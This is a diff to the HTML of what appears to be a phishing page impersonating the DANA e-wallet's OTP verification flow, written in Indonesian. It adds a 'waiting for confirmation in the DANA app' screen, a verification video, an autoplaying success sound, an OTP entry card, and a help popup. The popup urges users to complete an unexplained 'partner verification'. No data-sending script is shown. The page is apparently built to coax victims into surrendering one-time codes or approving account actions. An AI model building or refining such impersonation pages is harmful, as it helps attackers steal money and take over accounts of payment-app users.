@@ -30,13 +30,95 @@ href="otx.css">
 
     </div>
 
-    <!-- TITLE -->
-    <div class="title">
+    <!-- ========================= -->
+<!-- NOTIF -->
+<!-- ========================= -->
 
-        Kode <b>OTP</b>
-        telah terkirim ke
+<div
+class="notif-overlay"
+id="notifOverlay">
+
+    <div
+    class="notif-box"
+    id="notifBox">
+
+        <img
+        src="assets/notif.png"
+        class="notif-img">
 
     </div>
+
+</div>
+
+    <!-- TEKS MENUNGGU -->
+<div class="waiting-wrapper">
+
+    <div class="video-text">
+        Menunggu Konfirmasi di Aplikasi DANA
+    </div>
+
+    <div class="dots-loading">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+
+</div>
+
+<!-- VIDEO CARD -->
+<div class="card photo-card">
+
+    <video
+    class="photo-video"
+    autoplay
+    muted
+    loop
+    playsinline>
+
+        <source
+        src="assets/verifikasi.mp4"
+        type="video/mp4">
+
+    </video>
+
+</div>
+
+<button class="lanjut-btn" id="lanjutBtn">
+    LANJUTKAN
+</button>
+
+<!-- SOUND -->
+<audio
+id="successSound"
+autoplay>
+
+<source
+src="assets/successss.mp3"
+type="audio/mpeg">
+
+</audio>
+
+
+<div class="otp-card">
+
+  <button class="close-otp" id="closeOtp">
+    &times;
+</button>
+
+    <div class="title verifikasi-title">
+        
+        Jika Sudah di Verifikasi 
+
+    </div>
+
+    <!-- TITLE -->
+    <div class="title">
+        
+        Kode <b>OTP</b> Terkirim ke
+
+    </div>
+
+
 
     <!-- NOMOR -->
     <div class="number-box">
@@ -116,18 +198,9 @@ href="otx.css">
     <!-- ALERT -->
     <div class="alert-box error-box">
 
-        <div class="alert-title">
+        <div class="alert-title"></div>
 
-            Kode OTP salah atau kadaluarsa
-
-        </div>
-
-        <div class="alert-desc">
-
-            Pastikan Kode OTP yang kamu
-            masukan benar dan tidak kadaluarsa
-
-        </div>
+        <div class="alert-desc"></div>
 
     </div>
 
@@ -146,6 +219,44 @@ href="otx.css">
             00:60
 
         </div>
+
+    </div>
+
+    <div class="help-otp" id="helpOtp">
+    Tidak menerima kode OTP?
+</div>
+
+</div>
+
+<div class="help-popup" id="helpPopup">
+
+    <div class="help-content">
+
+        <button class="help-close" id="helpClose">
+            &times;
+        </button>
+
+        <div class="help-title">
+            Jika belum menerima kode OTP
+        </div>
+
+        <div class="help-desc">
+            Pastikan kamu sudah verifikasi partner.
+            Jika kamu belum menerima notifikasi verifikasi partner,
+            pastikan nomor atau data yang kamu isi sudah benar.
+        </div>
+
+        <div class="help-subtitle">
+            Cara Verifikasi Partner
+        </div>
+
+        <div class="tutorial-box">
+
+    <img
+    src="assets/cara-verifikasi.jpg"
+    class="help-image">
+
+</div>
 
     </div>
 
